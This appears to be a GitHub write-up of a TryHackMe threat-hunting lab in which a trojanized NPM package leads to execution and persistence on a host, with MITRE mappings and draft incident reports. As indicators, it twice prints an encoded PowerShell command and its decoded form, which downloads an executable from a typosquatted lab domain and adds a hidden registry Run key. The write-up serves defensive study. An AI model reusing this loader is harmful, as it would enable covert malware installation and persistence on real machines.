<h1 align="center">Threat Hunting Scenario &nbsp;&nbsp;&nbsp;·&nbsp;&nbsp;&nbsp; <a href="   "> Health Hazard</a></h1>
<p align="center"><img width="630px" src="https://github.com/user-attachments/assets/2febfb71-1aa9-49e8-ae13-a922f76c32fc"><br>
If you find it helpful, consider coming back for research.<br><p align="center"><a href="https://github.com/RosanaFSS"><img src="https://img.shields.io/github/followers/RosanaFSS?label=Follow&style=for-the-badge&logo=github&color=24292e" alt="Follow Rosana on GitHub"></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="https://img.shields.io/badge/COMPLETED-2026%2C%20JAN%2024-444444?style=for-the-badge&logo=calendar-check" alt="Completion Date"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.linkedin.com/in/rosanafssantos/"><img src="https://img.shields.io/badge/Connect-LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="Connect on LinkedIn"></a></p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Briefing](#1) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Hypothesis](#2) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Objectives](#3)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Methodology](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Documentation](#5)  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Practice](#6)

<br>
<br>
<h2>Briefing<a id='1'></a></h2>
<p>After months of juggling content calendars and caffeine-fueled brainstorming, co-founder Tom Whiskers finally carved out time to build the company’s first website. It was supposed to be simple: follow a tutorial, install a few packages, and bring the brand to life with lightweight JavaScript magic.<br>
But between sleepless nights and copy-pasted code, Tom started feeling off. Not sick exactly, just off. The terminal scrolled with reassuring green text, the site loaded fine, and everything looked normal.<br>
But no one really knows what might have been hidden beneath it all…<br>
It just waited.</p>
<br>
<br>
<h2>Hypothesis<a id='2'></a></h2>
<p>An attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection.</p>
<br>
<br>
<h2>Objectives<a id='3'></a></h2>
<p>

- Determine how a threat actor first gained a foothold on the system. Identify suspicious activity that may point to the initial compromise method.<br>
- Investigate signs of malicious execution following the initial access. Analyse the logs and system behaviour to uncover the attacker's actions.<br>
- Identify any mechanisms the attacker used to maintain access across system restarts or user sessions. Look for indicators of persistence that could allow long-term control.</p>

<br>
<br>
<h2>Methodology<a id='3'></a></h2>
<p>
  
- Step 1<br><strong>...</strong><br>...<br><br>
- Step 2<br><strong>...</strong><br>...<br><br>
- Step 3<br><strong>...</strong><br>....</p>

<br>
<br>
<h2>Documentation<a id='4'></a></h2>
<h3>Company Information</h3>

<img width="1900" height="880" alt="image" src="https://github.com/user-attachments/assets/6d491a39-a313-403e-b41d-42d349549f74" />

<br>
<h3>Asset Inventory</h3>

<img width="1899" height="892" alt="image" src="https://github.com/user-attachments/assets/53b8e1dc-8c04-481e-812a-c74aca575415" />


<br>
<br>
<br>
<h2>Practice<a id='5'></a></h2>

<h3>Hypothesis & Attack Chain</h3>

<div align="left"><h6>

|Stage<br><br><br>                                    |Adversary<br>Step<br>Description<br>                                                                                               |Timestamp<br><br><br>          |Tatic<br><br><br>                        |Technique<br><br><br>    |User<br><br><br>                    |Asset<br><br><br>           |List<br>of<br>IOC´s<br>                       |SIEM<br>URL<br>link<br>|_____<br><br><br>|_____<br><br><br>|
|:----------------------------------------------------|:----------------------------------------------------------------------------------------------------------------------------------|:------------------------------|:----------------------------------------|:------------------------|:-----------------------------------|:---------------------------|:---------------------------------------------|:----------------------|:----------------|:----------------|
|<strong>1</strong><br><br>Initial Access<br><br><br> |                                                                                                                                   |  <br><br><br><br>             |Initial Access<br><br><br><br><br>       |T1195<br><br><br><br><br>|tom@pawpress.me<br><br><br><br><br> |paw-tom<br><br><br><br><br> |_____________________________________________ <br> _____________________________________________ <br>_____________________________________________ <br> _____________________________________________ <br> _____________________________________________<br> _____________________________________________ <br> _____________________________________________<br>|-<br><br><br><br><br> |-<br><br><br><br><br>  |-<br><br><br><br><br>                 |-<br><br><br><br><br>                 |
|<strong>2</strong><br><br>Execution<br><br><br>      |                                                                                                                                   |  <br><br><br><br>             |Execution<br><br><br><br><br>            |T1059<br><br><br><br><br>|tom@pawpress.me<br><br><br><br><br> |paw-tom<br><br><br><br><br> |                                              |-<br><br><br><br><br>  |                 |                 |             
|<strong>3</strong><br><br>Persistence<br><br>____________________    |                                                                                                                                   |  <br><br><br><br>             |Persistence<br><br><br><br><br>          |T1547<br><br><br><br><br>|tom@pawpress.me<br><br><br><br><br> |paw-tom<br><br><br><br><br> |                                              |-<br><br><br><br><br>  |                 |                 |


</h6></div>

<h3>Hypothesis & Attack Chain : Analysis</h3>

<div align="left"><h6>

|Stage<br><br><br>                                  |Adversary<br>Step<br>Description<br>                           |Timestamp<br><br><br>|Tatic<br><br><br>    |Technique<br><br><br>                       |User<br><br><br>                                   |Asset<br><br><br>                             |List<br>of<br>IOC´s<br>              |SIEM<br>URL<br>link<br>|Score<br><br>+<code>320</code><br>|Value<br><br>360<br>|
|:--------------------------------------------------|:--------------------------------------------------------------|:--------------------|:--------------------|:-------------------------------------------|:--------------------------------------------------|:---------------------------------------------|:--------------------------------------------|:----------------------|--------:|--------:|
|<strong>Hypothesis</strong><br><br>Attack Chain<br><br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>1</strong> . Initial Access<br><br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>2</strong> . Execution<br><br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>3</strong> . Persistence<br>____________________|-<br><br>+ &nbsp;<code>20</code><br><br>+ &nbsp;10<br><br>+ &nbsp;&nbsp;5<br><br>+ &nbsp;&nbsp;5<br>___________|-<br><br>+ &nbsp;<code>40</code><br><br>+ &nbsp;20<br><br>+ &nbsp;20<br><br>Incorrect<br>_________|-<br><br>+ &nbsp;<code>60</code><br><br>+ &nbsp;20<br><br>+ &nbsp;20<br><br>+ &nbsp;20<br>___________|-<br><br>+ &nbsp;<code>60</code><br><br>+ &nbsp;20<br><br>+ &nbsp;20<br><br>+ &nbsp;20<br>__________|-<br><br>+ &nbsp;<code>30</code><br><br>+ &nbsp;10<br><br>+ &nbsp;10<br><br>+ &nbsp;10<br>_______________|-<br><br>+ &nbsp;<code>30</code><br><br>+ &nbsp;10<br><br>+ &nbsp;10<br><br>+ &nbsp;10<br>_______|-<br><br>+ &nbsp;<code>20</code><br><br>+ &nbsp;10<br><br>+ &nbsp;&nbsp;5<br><br>+ &nbsp;&nbsp;5<br>___________|-<br><br>-<br><br>-<br><br>-<br><br>-<br>____|+<code>60</code><br><br>+<code>260</code><br><br>+100<br><br>+90<br><br>+70<br>____|+60<br><br>+260<br><br>+100<br><br>+100<br><br>+100<br>____|

</h6></div>


<img width="1884" height="872" alt="image" src="https://github.com/user-attachments/assets/2febfb71-1aa9-49e8-ae13-a922f76c32fc" />


Stage 1 : Initial Access
Tactic : Initial Access (TA0001)
Technique : Supply Chain Compromise (T1195)

Stage 2 : Installation of Malware
Tactic : Execution (TA0002)
Technique : Command and Scripting Interpreter (T1059)

Stage 3 : Persistence
Tactic : Persistence (TA0003)
Technique : Boot or Logon Autostart Execution (T1547)















n attacker may have leveraged a compromised third-party software package to gain initial access to the system and silently stage a payload for later execution. They likely established persistence to maintain access without immediate detection



















<img width="467" height="815" alt="image" src="https://github.com/user-attachments/assets/10e5d6c3-0acd-4c92-ba47-b4ce07a4888b" />
Stage 1 of 3

Initial Access
- Trojanized NPM package "healthchk-lib@1.0.1c" was executed during the NPM installation on 6/21/25 10:58:24.000 AM in the host PAW-TOM\itadmin-tom. - The execution was performerd through the command line "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1".
Timestamp:
Jun 21st, 2025, 10:35:24 AM
Tactic:
Initial Access
Technique:
T1195
User (Optional)
tom@pawpress.me
Asset
paw-tom
List of IOCs:
-  ParentProcessId: 1452
-  ProcessId: 1924
-  Command Line: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1
-  ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
SIEM URL link (Optional)
https://10-10-130-152.reverse-proxy-eu-west-1.tryhackme.com/en-US/app/search/search?earliest=0&latest=&q=search%20*%20cmd%20CommandLine!%3D



<img width="479" height="829" alt="image" src="https://github.com/user-attachments/assets/1d214982-79b9-4b86-81e2-f21094b1ab07" />

Stage 2 of 3

Execution
On 6/21/25 10:58:27.000 AM the attacker launched an encoded command using "cmd.exe" through "C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand [encoded command: details in IoCs]. The decoded part of the command line provide evidence that the attacker downloaded "SystemHealthUpdater.exe" from a remote server "http://global-update.wlndows.thm/SystemHealthUpdater.exe" levering the creation of a register key to add persistence: "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' ` -Name 'Windows Update Monitor' -Value $runCmd".
Timestamp:
Jun 21st, 2025, 10:58:27 AM
Tactic:
Execution
Technique:
T1059
User (Optional)
tom@pawpress.me
Asset
paw-tom
List of IOCs:
-  CommandLine:  C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQADQAKACQAZQBuAGMAbwBkAGUAZAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnACQAZABlAHMAdAAnACIAKQANAAoAKQANAAoADQAKACMAIABCAHUAaQBsAGQAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAHIAdQBuAEMAbQBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnACAAKwAgACQAZQBuAGMAbwBkAGUAZAANAAoADQAKACMAIABBAGQAZAAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGYAbwByACAAcABlAHIAcwBpAHMAdABlAG4AYwBlAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnACAAYAANAAoAIAAgACAAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABVAHAAZABhAHQAZQAgAE0AbwBuAGkAdABvAHIAJwAgAC0AVgBhAGwAdQBlACAAJAByAHUAbgBDAG0AZAA=

-  Decoded Ba64:
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $dest

# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd
  
SIEM URL link (Optional)
https://10-10-130-152.reverse-proxy-eu-west-1.tryhackme.com/en-US/app/search/search?earliest=0&latest=&q=search%20*%20cmd%20CommandLine!%3D%22%22%20paw-tom%20%20Hidden%20%7C%20sort%20by%20%2B_time&display.page.search.mode=verbose&dispatch.sample_ratio=1&display.general.type=events&sid=1769262398.28




<img width="473" height="746" alt="image" src="https://github.com/user-attachments/assets/bcacd640-ba88-44e6-9aa2-3b973d5c9370" />


Stage 3 of 3

Persistence
- The attacker achieved persistence by creating a Run Key at the Register Hive located at: "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' ` -Name 'Windows Update Monitor' -Value $runCmd". - The attacker named the Registry Path " -Name 'Windows Update Monitor' -Value $runCmd".
Timestamp:
Jun 21st, 2025, 10:58:27 AM
Tactic:
Persistence
Technique:
T1547
User (Optional)
tom@pawpress.me
Asset
paw-tom
List of IOCs:
-  Persistence Building Evidence: "$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded"
-   Persistence Registry Evidence: "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' ` -Name 'Windows Update Monitor' -Value $runCmd".
SIEM URL link (Optional)
https://10-10-130-152.reverse-proxy-eu-west-1.tryhackme.com/en-US/app/search/search?earliest=0&latest=&q=search%20*%20cmd%20CommandLine!%3D%22%22%20paw-tom%20%20Hidden%20%7C%20sort%20by%20%2B_time&display.page.search.mode=verbose&dispatch.sample_ratio=1&display.general.type=events&sid=1769262398.28





<img width="1643" height="593" alt="image" src="https://github.com/user-attachments/assets/adb97842-0286-40ce-a00f-39d2fccc71c2" />













Threat Report
Cyber Threat Case Report: Trojanized NPM Package
Executive Summary
This report details a multi-stage cyber attack initiated through a trojanized NPM package that compromised the host PAW-TOM by exploiting supply chain vulnerabilities. The attack was executed in a structured manner, covering Initial Access, Execution, and Persistence tactics.

Stage 1: Initial Access
Description: An NPM package "healthchk-lib@1.0.1c" was executed on the host PAW-TOM through a command line on June 21, 2025, at 10:58:24 AM. The package was maliciously altered to serve as a vector for further exploitation.
Techniques: Initial Access via Supply Chain Compromise (T1195).
Indicators of Compromise (IoC): Command execution traced to Node.js installation path with relevant Process IDs noted.
User & Asset: tom@pawpress.me on host PAW-TOM.
SIEM Reference: View detailed logs.
Stage 2: Execution
Description: The attacker utilized "cmd.exe" to launch an encoded PowerShell command to download and execute a payload from a remote server.
Techniques: Execution via Command and Scripting Interpreter (T1059).
IoCs: Evidence of PowerShell execution with obfuscated Base64 commands targeting the download of "SystemHealthUpdater.exe".
SIEM Reference: Investigate execution logs.
Stage 3: Persistence
Description: Persistence was achieved by establishing a Run Key in the Windows Registry to ensure execution upon system startup.
Techniques: Boot or Logon Autostart Execution (T1547).
IoCs: Registry key added to HKCU path with encoded command strings.
User & Asset: tom@pawpress.me on host PAW-TOM.
SIEM Reference: Review persistence activity.
Conclusion
The attack demonstrates a sophisticated exploitation path leveraging a supply chain compromise to gain initial ac



<img width="1628" height="595" alt="image" src="https://github.com/user-attachments/assets/50379209-5e1f-4346-93b3-2c500a29bbfd" />












<img width="472" height="826" alt="image" src="https://github.com/user-attachments/assets/6712023f-65d7-4b1b-a3a8-4b1b2b6c1ab8" />



On 6/21/25 10:58:27.000 AM the attacker launched an encoded command using "cmd.exe" through "C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand [encoded command: details in IoCs].

The decoded command provides evidence that the attacker downloaded "SystemHealthUpdater.exe" from the remote server "http://global-update.wlndows.thm/SystemHealthUpdater.exe" and leveraged the creation of a Registry key to add persistence: "Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Update Monitor' -Value $runCmd".

Extracted Network & File Artifacts:

-  Malicious Domain:  global-update.wlndows.thm (Note the typosquatting: 'l' instead of 'i')

-  Payload URL: http://global-update.wlndows.thm/SystemHealthUpdater.exe

-  Dropped File Path: %APPDATA%\SystemHealthUpdater.exe

Extracted Registry Artifacts:

-  Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run

-  Value Name: Windows Update Monitor

-  Full Command Line (Obfuscated):  C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQADQAKACQAZQBuAGMAbwBkAGUAZAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnACQAZABlAHMAdAAnACIAKQANAAoAKQANAAoADQAKACMAIABCAHUAaQBsAGQAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAHIAdQBuAEMAbQBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnACAAKwAgACQAZQBuAGMAbwBkAGUAZAANAAoADQAKACMAIABBAGQAZAAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGYAbwByACAAcABlAHIAcwBpAHMAdABlAG4AYwBlAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnACAAYAANAAoAIAAgACAAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABVAHAAZABhAHQAZQAgAE0AbwBuAGkAdABvAHIAJwAgAC0AVgBhAGwAdQBlACAAJAByAHUAbgBDAG0AZAA=

-  Decoded From Base64 PowerShell Payload:
$dest = "$env:APPDATA\SystemHealthUpdater.exe"
$url = "http://global-update.wlndows.thm/SystemHealthUpdater.exe"

# Download file
Invoke-WebRequest -Uri $url -OutFile $dest

# Base64 encode the command
$encoded = [Convert]::ToBase64String(
    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
)

# Build persistence command
$runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded

# Add to registry for persistence
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'Windows Update Monitor' -Value $runCmd














Cyber Attack Chain Report
Executive Summary
This report outlines a multi-stage cyber attack that was executed against the host PAW-TOM\itadmin-tom, which is associated with the user tom@pawpress.me. The attack sequence involves three critical stages: Initial Access, Execution, and Persistence. Each stage utilizes specific tactics and techniques to compromise the system and maintain unauthorized access.

Stage 1: Initial Access
Description: The attack commenced with the execution of a trojanized NPM package healthchk-lib@1.0.1c during an NPM installation on June 21, 2025. This malicious package was installed via the command line, leveraging a supply chain compromise to gain initial access.
Tactic & Technique: Initial Access (TA0001), Supply Chain Compromise (T1195)
Indicators of Compromise (IOCs):
Parent Process ID: 1452
Process ID: 1924
Command Line: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" install healthchk-lib@1.0.1
SIEM Link: View in SIEM
Stage 2: Execution
Description: The attacker executed an encoded PowerShell command via cmd.exe, which downloaded SystemHealthUpdater.exe from a malicious domain and created a registry key for persistence.
Tactic & Technique: Execution (TA0002), Command and Scripting Interpreter (T1059)
IOCs:
Malicious Domain: global-update.wlndows.thm
Payload URL: http://global-update.wlndows.thm/SystemHealthUpdater.exe
Dropped File Path: %APPDATA%\SystemHealthUpdater.exe
Registry Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
SIEM Link: View in SIEM
Stage 3: Persistence
Description: Persistence was achieved by creating a Run Key in the registry to execute a PowerShell script at startup.
Tactic & Technique: Persistence (TA0003), Boot or Logon Autostart Execution (T1547)
IOCs:
Persistence Command: $runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded
Registry Path: Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Windows Update Monitor' -Value $runCmd
SIEM Link: View in SIEM
Conclusion
The attack sequence illustrates a sophisticated supply chain compromise followed by command execution and persistence mechanisms. The attack leveraged common scripting tools and registry manipulation to maintain a foothold on the compromised host. Immediate remediation efforts are crucial to mitigate further risks associated with this breach.





<img width="1252" height="299" alt="image" src="https://github.com/user-attachments/assets/c7055625-ea60-47af-873c-2a144d1ada4b" />


<img width="1116" height="902" alt="image" src="https://github.com/user-attachments/assets/7f1264e1-b7b1-4bfb-8cd4-acd76dcbaa54" />



<img width="1127" height="419" alt="image" src="https://github.com/user-attachments/assets/36c38f0f-a6b5-42cd-a071-d928347c804e" />


<img width="266" height="174" alt="image" src="https://github.com/user-attachments/assets/05ffa54a-7df2-4e28-aa57-7f26d55329cd" />


<img width="266" height="259" alt="image" src="https://github.com/user-attachments/assets/896ed237-607d-479f-bc83-6f830a6ca4cc" />

<img width="262" height="277" alt="image" src="https://github.com/user-attachments/assets/595dbc58-7ce6-41fb-bbeb-0076b03b706b" />










